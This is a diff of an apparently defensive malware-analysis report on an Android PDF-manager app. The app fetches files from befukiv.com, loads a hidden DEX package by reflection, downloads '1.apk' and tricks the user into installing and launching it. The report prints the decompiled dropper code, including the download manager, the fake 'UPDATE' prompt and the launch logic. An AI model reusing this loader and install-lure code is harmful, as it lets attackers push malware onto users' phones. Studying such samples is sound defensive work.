@@ -73,8 +73,8 @@ flowchart TD
     C --> D([mapMuchasPuchasToMethods])
     D --> E([travisscot.init])
     E --> B
-    B --> F{traviscot initialized ?}
-    F -- Yes ---> G([traviscot.makePdfPage])
+    B --> F{travisscot initialized ?}
+    F -- Yes ---> G([travisscot.makePdfPage])
     G --- H[set 1.apk url]
     G --> I([PartPreviewActivity.onNewIntent])
     I --> J([PartPreviewActivity.onCreate])
@@ -82,7 +82,29 @@ flowchart TD
 
 We start our analysis in the _com.tragisoap.fileandpdfmanager.MainActivity_ class has it is the applications start point. From this class we can only see that there are a few listeners for clicking which is to be expected in a mobile application.
 
-We can reconstruct the malicious flow, starting from the _PreviewActivity_ class, which in turn gets a variable from _FileManagerService_ that appears to be a counter of some kind ... TO COMPLETE
+We can reconstruct the malicious flow, starting from the _PreviewActivity_ class, which in turn gets a variable from _FileManagerService_ that appears to be a counter of some kind. I can't trace it's use, assuming it is used at all, but we can explore the class from where it's from.
+
+The _FileManagerService_ is quite small and it's behaviour is, for lack of a better word, strange. All it does is try to call two methods and if it is not successful it wither prints the stack trace of the error of returns to the _MainActivity_ after setting a flag.
+
+```java
+public final void a() {
+    try {
+        Malicious.fetchFilesAndProcess();                   // <--- Suspicious call
+        try {
+            Malicious.makePdfPage.invoke(null, this);       // <--- Suspicious call
+        } catch (IllegalAccessException | InvocationTargetException e) {
+            e.printStackTrace();
+        }
+    } catch (Throwable th) {
+        th.printStackTrace();
+        Intent intent = new Intent(this, MainActivity.class);
+        intent.addFlags(268435456);
+        startActivity(intent);
+    }
+}
+```
+
+We inspect the content of the first method called, _fetchFilesAndProcess_, and it has the following structure.
 
 ```java
 public static void fetchFilesAndProcess() {
@@ -116,7 +138,7 @@ public static void fetchFilesAndProcess() {
 }
 ```
 
-Although it's obfuscated, we can see that it's accessing files from the domain **befukiv.com**. A DNS search reveals that this domain has two name servers pointing to domains in Russia.
+Although it's obfuscated, we can see that it's accessing files from the domain **befukiv.com** in order to download two files. A DNS search reveals that this domain has two name servers pointing to domains in Russia.
 
 ```
 ...
@@ -129,19 +151,17 @@ DNSSEC: unsigned
 ...
 ```
 
-At the time this report is being written, the server is accessible, but the resources are not available (it returns a 'not found' response).
-
-But we have access to these files as they were previously downloaded, so it's possible to continue our analysis.
+At the time this report is being written, the server is accessible, but the resources are not available (it returns a 'not found' response). But we have access to these files as they were previously downloaded, so it's possible to continue our analysis.
 
 ### Exploring 'muchaspuchas'
 
-The **'muchaspuchas'** file is composed of what seems to be Java method or class names separated by the | character. The function where this file is being downloaded splits the file contents by the | character.
+The **'muchaspuchas'** file is composed of what seems to be Java method or class names separated by the ´|´ character. The function where this file is being downloaded splits the file contents by the ´|´ character.
 
 ```
 dalvik.system.InMemoryDexClassLoader|getClassLoader|loadClass|com.travisscott.pdf.MainLibrary|...
 ```
 
-This shows that the authors maybe wanted to obfuscate application method calls with reflection. To confirm this assumption we decided to analyze `mapMuchasStringsToMethods` function and deofuscated it in the following way.
+This shows that the authors maybe wanted to obfuscate application method calls with reflection. To confirm this assumption we decided to analyze _mapMuchasStringsToMethods_ method and rename it's methods.
 
 ```java
     public static void mapMuchasPuchasToMethods(byte[] bArr) {
@@ -158,43 +178,32 @@ This shows that the authors maybe wanted to obfuscate application method calls w
     }
 ```
 
-From that, we can see that the function is using java reflection to dynamically assign variables of Malicious class based on methods/classes names obtained from muchaspuchas file.
+From that, we can see that the function is using java reflection to dynamically assign variables of Malicious class based on methods/classes names obtained from _muchaspuchas_ file.
 
 The _mapMuchasStringsToMethods_ method receives as an argument a byte array containing data from _cortina_ file. It seems that it's loading a class based on the binary file. Based on that we decided to analyze as a next step, to analyze the _cortina_ file.
 
 ### Exploring 'cortina'
-TODO - Explain: 
-1. Cortina is a DEX file with the package _travisscot_, we can confirm this by running `$ file cortina`
-2. Open _cortina.dex_ in JADX.
-3. _travisscot_ is invoked at the end of the _mapMuchasPuchasToMethods_ method.
-4. _travisscot_ functions as a library that extends the main file with functionalities.
+
+The second file, _cortina_ does not contain a structure that we can be directly observer, because of this we decided to use the `file` tool to discover the format of the file.
+
+```bash
+file cortina
+```
+
+This return a result indicating that in fact, _cortina_ is a **Dalvix dex file**. This can be confirmed by examining the file signature and match it agains a known dex file, which confirms the result.
+
+Using `apktool` or JADX we can then open the cortina.dex and find that it contains a package called _com.travisscot.pdf_. Remembering what was already processed when the application used reflection to create new methods, and reading the _muchaspuchas_ file, we see that at the end of the _mapMuchasPuchasToMethods_, **this new imported packages is initialized**. So we can assume that wha this files have done was **expanding the existing application with new functionalities previously unknown**.
 
 ```java
-public class FileManagerService extends f {
-
-    /* renamed from: j */
-    public static final /* synthetic */ int f3513j = 0;
-
-    @Override // f1.f
-    public final void a() {
-        try {
-            Malicious.fetchFilesAndProcess();
-            try {
-                Malicious.makePdfPage.invoke(null, this);
-            } catch (IllegalAccessException | InvocationTargetException e) {
-                e.printStackTrace();
-            }
-        } catch (Throwable th) {
-            th.printStackTrace();
-            Intent intent = new Intent(this, MainActivity.class);
-            intent.addFlags(268435456);
-            startActivity(intent);
-        }
-    }
+public static void init(Class<? extends Activity> PartPreviewActivity2, Class<? extends Activity> mainClass2) {
+    PartPreviewActivity = PartPreviewActivity2;
+    MainActivity = mainClass2;
 }
 ```
 
-All that we have seen so far as happened when the _Malicious.fetchFilesAndProcess_ was called which then resulted in a an additional set of functions to be loaded. One of this function, _makePdfPage_ is called after the package is loaded.
+The initialization of the _travisscot_ package only consists on loading the _PartPreviewActivity_ and the _MainActiviy_, most probably to allow in to traverse between the legitimate application and this new package. After this is done, we will now start to see the methods defined in this package being called.
+
+Remembering the _FileManagerService_ previously shown, we see that it will call the _makePdfPage_ method. This method is defined in the _travisscot_ package.
 
 ```java
 public static void makePdfPage(Context context) {
@@ -202,7 +211,7 @@ public static void makePdfPage(Context context) {
 }
 ```
 
-It then calls yet another function, also from the _travisscot_ package which is shown bellow.
+It in turn calls yet another function, also from the _travisscot_ package which is shown bellow.
 
 ```java
 public static void handleWork(Context context) {
@@ -241,36 +250,6 @@ This method will check in which country the current device is operating and stop
 After doing this, it creates a new _Intent_ object and starts the activity of the _PartPreviewActiviy_ class.
 
 ```java
-public final void onCreate(Bundle bundle) {
-    String str;
-    String str2 = "tura dar";
-    super.onCreate(bundle);
-    s().t(1);
-    getWindow().setStatusBarColor(0);
-    setContentView(2131492981);
-    TextView textView = (TextView) findViewById(2131296755);
-    try {                                                               // First try
-        m.f3835d.invoke(null, this);                
-    } catch (IllegalAccessException | InvocationTargetException e) {
-        e.printStackTrace();
-    }
-    Button button = (Button) findViewById(2131296492);
-    try {                                                               // Second try
-        str = (String) m.f3833b.invoke(null, new Object[0]);
-    } catch (IllegalAccessException | InvocationTargetException e7) {
-        e7.printStackTrace();
-        str = "tura dar";
-    }
-    textView.setText(str);
-    try {                                                               // Third try
-        str2 = (String) m.f3834c.invoke(null, new Object[0]);
-    } catch (IllegalAccessException | InvocationTargetException e8) {
-        e8.printStackTrace();
-    }
-    button.setText(str2);
-    button.setOnClickListener(new q(4, this));
-}
-
 @Override // androidx.fragment.app.q, androidx.activity.ComponentActivity, android.app.Activity
 public final void onNewIntent(Intent intent) {
     super.onNewIntent(intent);
@@ -279,19 +258,151 @@ public final void onNewIntent(Intent intent) {
         startActivity((Intent) extras.get("android.intent.extra.INTENT"));
     }
 }
+```
 
-@Override // androidx.fragment.app.q, android.app.Activity
-public final void onResume() {
-    super.onResume();
+From this, we can see that when a new _Intent_ is created, the application queries the system regarding the status do a permission, with a little search online we can say, with some certainty, this is a **permission related with the capability of a package to install other packages**, and if the application has this permission, it then starts the activity which takes us to the _onCreate_ method.
+
+```java
+public final void onCreate(Bundle bundle) {
+    String str;
+    String str2 = "tura dar";
+    super.onCreate(bundle);
+    s().t(1);
+    getWindow().setStatusBarColor(0);
+    setContentView(R.layout.part_preview);
+    TextView textView = (TextView) findViewById(R.id.rse345234a);
     try {
-        Malicious.getName.invoke(null, this);
+        Malicious.launch.invoke(null, this);                                    // <--- travisscot method 
     } catch (IllegalAccessException | InvocationTargetException e) {
         e.printStackTrace();
+    }
+    Button button = (Button) findViewById(R.id.g234gasaa);
+    try {
+        str = (String) Malicious.getFirstText.invoke(null, new Object[0]);      // <--- travisscot method
+    } catch (IllegalAccessException | InvocationTargetException e7) {
+        e7.printStackTrace();
+        str = "tura dar";
+    }
+    textView.setText(str);
+    try {
+        str2 = (String) Malicious.getSecondText.invoke(null, new Object[0]);    // <--- travisscot method
+    } catch (IllegalAccessException | InvocationTargetException e8) {
+        e8.printStackTrace();
+    }
+    button.setText(str2);
+    button.setOnClickListener(new q(4, this));
+}
+```
+
+This is were then starts to directly interact with the user in a suspicious manner. It first calls the _launch_ method.
+
+```java
+public static void launch(Context context) {
+    downloadRecorderManager.startDownload(context, url.get());
+}
+```
+```java
+public class DownloadRecorderManager {
+    private static final String FILE_BASE_PATH = "file://";
+    public static final String FILE_NAME = "1.apk";
+    private static final String MIME_TYPE = "application/vnd.android.package-archive";
+    public static final AtomicBoolean downloaded = new AtomicBoolean(false);
+    private static int sessionId;
+
+    public void startDownload(Context context, String url) {
+        String dest = (context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS).toString() + File.pathSeparator) + FILE_NAME;
+        Uri.parse(FILE_BASE_PATH + dest);
+        File file = new File(dest);
+        if (!file.exists()) {
+            DownloadManager downloadManager = (DownloadManager) context.getSystemService("download");
+            Uri downloadUri = Uri.parse(url);
+            DownloadManager.Request request = new DownloadManager.Request(downloadUri);
+            request.setMimeType(MIME_TYPE);
+            request.setTitle(FILE_NAME);
+            request.setDescription(FILE_NAME);
+            request.setDestinationInExternalFilesDir(context, Environment.DIRECTORY_DOWNLOADS, FILE_NAME);
+            registerDownloadReceiver(context);
+            downloadManager.enqueue(request);
+            return;
+        }
+        downloaded.set(true);
+        showInstallDialog(context);
+    }
+    // ... more bellow
+}
+
+```
+
+Here it will begin to download and install an APK package, and if we remember from previously on the _ServiceHandler.handleWork_ method, an url was set to download a file called _1.apk_.
+
+We won't show all the code for the download has it is quite straight forward to understand, but in sum what is happening is that the application is now showing dialog boxes to the user, as expected, for the user to grant permission to application to install packages from external sources, which is a capability of Android which is, by default, disabled.
+
+The flow of operation between the methods of the class _DownloadRecorderManager_ for downloading the package is the following.
+
+```mermaid
+flowchart LR
+    A([startDownload]) --> B([registerDownloadReceiver])
+    B --> C([showInstallDialog])
+    C --> D([showNewInstallDialog2])
+    D --> E([addApkToInstallSession])
+```
+
+Coming back to the _PartPreviewActiviy.onCreate_ method, the _getFirstText_ and _getSecondText_ are probing the application language, and base on that, print messages to the screen and the button, informing that the application needs to be updated and instructing the user to press the button now displaying the "UPDATE" text. After this, it set an event listener on the button, and passes as an argument the number 4, but why? Lets find out!
+
+```java
+public final void onClick(View view) {
+    EditText editText;
+    PasswordTransformationMethod passwordTransformationMethod = null;
+    switch (this.f3099f) {
+        ...
+        case 4:
+            PartPreviewActivity partPreviewActivity = (PartPreviewActivity) this.f3100g;
+            int i7 = PartPreviewActivity.D;
+            partPreviewActivity.getClass();
+            try {
+                Malicious.readPdfFile.invoke(null, partPreviewActivity);
+                return;
+            } catch (IllegalAccessException | InvocationTargetException e) {
+                e.printStackTrace();
+                return;
+            }
+        ...
+    }
+    ...
+}
+```
+
+Sure enough, we can see that it calls _travisscot.readPDFfile_. Which in essence just checks if the malicious APK is still being installed.
+
+```java
+public static void readPDFfile(Context context) {
+    if (DownloadRecorderManager.downloaded.get()) {
+        downloadRecorderManager.showInstallDialog(context);
+    } else {
+        Toast.makeText(context, "Please wait until the download is finished", 0).show();
     }
 }
 ```
 
-TODO: continue to follow the flow
+If we take a look again at the flowchart previously displayed and again follow it to _travisscot.showNewInstallDialog2_ to show a dialog informing the user if the installation is still taking place, but in here it also connects what appears to be a download status callback to a pending _Intent_ from the _PartPreviewActivity_ and sets the _Action_ to _"com.tragisoap.fileexplorerpdfviewer.SESSION_API_PACKAGE_INSTALLED"_.
+
+Now, this is were things complicate. As of the timing of writing this report, we are still missing the link that results in the calling of _PartPreviewActivity.onResume()_. However, we can clearly see that this in turn calls the _travisscot.getName()_ method.
+
+```java
+public static void getName(Context context) {
+    String target = packageName.get();
+    if (target != null && !target.isEmpty()) {
+        PackageManager pm = context.getPackageManager();
+        Intent launch = pm.getLaunchIntentForPackage(target);
+        if (launch != null) {
+            launch.addFlags(268435456);
+            context.startActivity(launch);
+        }
+    }
+}
+```
+
+And even missing the link, from all that we gather until here, it is quite obvious that the package installed with _1.apk_ is now being launched.
 
 ### Exploring '1.apk'
 
